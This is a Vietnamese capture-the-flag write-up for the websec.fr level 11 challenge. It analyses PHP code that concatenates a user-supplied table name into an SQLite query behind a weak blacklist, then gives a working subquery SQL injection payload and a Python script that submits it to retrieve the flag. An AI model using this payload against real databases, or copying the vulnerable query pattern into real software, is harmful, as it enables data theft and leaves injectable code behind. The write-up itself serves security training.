# Đoạn code xử lý logic
```PHP
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

function sanitize($id, $table) {
    /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */
    if (! is_numeric ($id) or $id < 2) {
        exit("The id must be numeric, and superior to one.");
    }

    /* Rock-solid too! */
    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
    foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
            exit("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id']) && isset ($_POST['table'])) {
    $id = $_POST['user_id'];
    $table = $_POST['table'];

    sanitize($id, $table);

    $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
    $query = 'SELECT id,username FROM ' . $table . ' WHERE id = ' . $id;
    //$query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id;

    $getUsers = $pdo->query($query);
    $users = $getUsers->fetchArray(SQLITE3_ASSOC);

    $userDetails = false;
    if ($users) {
        $userDetails = $users;
    $userDetails['table'] = htmlentities($table);
    }
}
```  
```PHP
<?php if (isset ($userDetails) && !empty ($userDetails)): ?>
    <br>
    <div class="row">
        <p class="well">
            The hero number <strong><?php echo $userDetails['id']; ?></strong>
            in <strong><?php echo $userDetails['table']; ?></strong>
            is <strong><?php echo $userDetails['username']; ?></strong>.
        </p>
    </div>
<?php endif; ?>
```
# Phân tích luồng hoạt động
Hàm `sanitize` nhận 2 biến đầu vào là `$id` và `$table` từ `$_POST['user_id']` và `$_POST['table']`.  

```PHP
if (! is_numeric ($id) or $id < 2) {
        exit("The id must be numeric, and superior to one.");
    }
```  
Kiếm tra xem `$id` có phải là 1 số và lớn hơn 2 hay không
* Đúng => Tiếp tục chạy các lệnh tiếp theo
* Sai => In ra lỗi và dừng chương trình

```PHP
$special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
```

Tạo `$blacklist` là merge của 4 mảng `special1`, `special2`, `special3`, `sql`

```PHP
foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
            exit("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
```

Duyệt từng phần tử trong `$blacklist` (Không phân biệt hoa thường) và đem kiểm tra xem bên trong `$table` có chứa các ký tự hoặc từ khóa này không
* Có => In ra lỗi và dừng chương trình
* Sai => Tiếp tục chạy các lệnh tiếp theo

```PHP
$getUsers = $pdo->query($query);
    $users = $getUsers->fetchArray(SQLITE3_ASSOC);

    $userDetails = false;
    if ($users) {
        $userDetails = $users;
    $userDetails['table'] = htmlentities($table);
    }
```

Xử lý nếu câu lệnh truy vấn (`$query`) lỗi => In ra điểm lỗi sau khi đã được làm sạch bằng hàm  `htmlentities()`  

```PHP
<?php echo $userDetails['id']; ?>
<?php echo $userDetails['username']; ?>
```

In ra giá trị của 2 cột `id` và `username` khi `SELECT`  

# Analysis
Cố 1 dòng comment mà tác giả đã cố tình để lại nhằm gợi ý cho chúng ta `//$query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id;`. Mặc dù câu lệnh trên chỉ select 2 cột `id` và `username`, nhưng thực tế trong bảng còn có thêm 1 cột nữa đó là cột `enemy`, vì vậy chúng ta có thể đoán được rằng tác giả muốn ta khai thác giá trị cột `enemy`

Để ý thêm 1 chi tiết nữa là ở blacklist tác giả cố tình chặn đi chỉ mình số 0: `$sql = ["union", "0", "join", "as"];`. Chúng ta có thể đoán rằng tại `id` bằng 0 ẩn chứa 1 cái gì đấy mà trong trường hợp này có lẽ là flag  

Ta thấy `$query` được tạo ra bằng cách chèn trực tiếp giá trị của `$id` và `$table` vào câu truy vấn  
`$query = 'SELECT id,username FROM ' . $table . ' WHERE id = ' . $id;`    

# Payload exploit
**Tôi sử dụng burpsuite trong quá trình khai thác bài này**  

Chỉ thông qua blacklist để làm sạch dữ liệu thì thực sự điều này thật ngây thơ. Sau khi recon thử, tôi thấy có 1 vài ký tự không bị filter mà chúng ta có thể sử dụng đó là: dấu cách và dấu `()`. Ngoài ra việc chỉ có mình từ khóa `union`,`join`,`as` bị filter cũng mở ra rất nhiều hướng tấn công. Không phải lúc nào chúng ta cũng cần dùng `union` để thực hiện các câu lệnh select khác  

Ví dụ như trong trường hợp này, nếu tôi chèn 1 payload vào `$table`: `(SELECT id,enemy username FROM costume)`. Khi đó câu lệnh truy vấn trờ thành: `SELECT id,username FROM (SELECT id,enemy username FROM costume) WHERE id=$id`. 

Có thể thấy, bây giờ cột `username` đang có giá trị chính là cột `enemy` => Bước đầu thành công.Tuy nhiên sau khi thử cỡ 100 id (từ 2-100) thì tôi vẫn không thu được flag nào => flag chắc chắn nằm trong enemy có id<2 , mà có thể là id=0 (do số 0 bị filter).  

Vậy làm sao để truy cập vào giá trị của id=0, điều này thực sự đơn giản. Nhớ rằng SQLite có câu lệnh `Limit` cho phép giới hạn hàng in ra. Việc tìm hiểu tác dụng của câu lệnh `LIMIT` các bạn có thể tự tìm hiểu, ở đây tôi chỉ tập trung vào payload khai thác.  
Payload: `(SELECT 2 id,enemy username FROM costume LIMIT 1)`  
Khi đó câu lệnh truy vấn trở thành:  
`SELECT id,username FROM (SELECT 2 id,enemy username FROM costume LIMIT 1) WHERE id=2`  

Mặc dù ta SELECT tại id=0 nhưng qua câu lệnh trên id đã bị gán cứng bằng 2, do đó nó luôn hợp lệ và từ đó lấy được flag.  


Bạn cũng có thể sử dụng đoạn code python bên dưới để tự động hóa gửi payload và lấy flag:
```python
import requests
import re

burp0_url = "https://websec.fr:443/level11/index.php"
burp0_data = {"user_id": "2", "table": "(SELECT 2 id,enemy username FROM costume Limit 1)", "submit": "Submit Query"}
res=requests.post(burp0_url, data=burp0_data)
match = re.search(r'WEBSEC\{[^}]+\}', res.text)
print(match.group(0))
```